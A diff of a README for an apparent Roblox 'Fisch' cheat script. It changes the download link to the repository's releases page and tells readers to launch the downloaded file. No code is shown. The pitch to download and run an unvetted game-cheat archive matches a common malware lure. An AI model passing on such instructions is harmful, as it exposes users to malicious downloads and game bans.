@@ -34,9 +34,9 @@ The repository covers a variety of topics related to the Fisch script, including
 - roblox-fisch-script
 
 ## Get Started 🚗
-To download the script and start enhancing your Roblox gaming experience, click [here](https://github.com/releases/789694263/Release.zip). Make sure to launch the file after downloading to begin using the script.
+To download the script and start enhancing your Roblox gaming experience, click [here](https://github.com/sasikaanoj/roblox-fisch-script/releases). Make sure to launch the file after downloading to begin using the script.
 
-![Download Script](https://img.shields.io/badge/Download-Script-green)
+![Download Script](https://github.com/sasikaanoj/roblox-fisch-script/releases)
 
 ## Additional Information ℹ️
 If the provided link is not functioning or you need more information, please visit the "Releases" section of the repository for alternative download options.
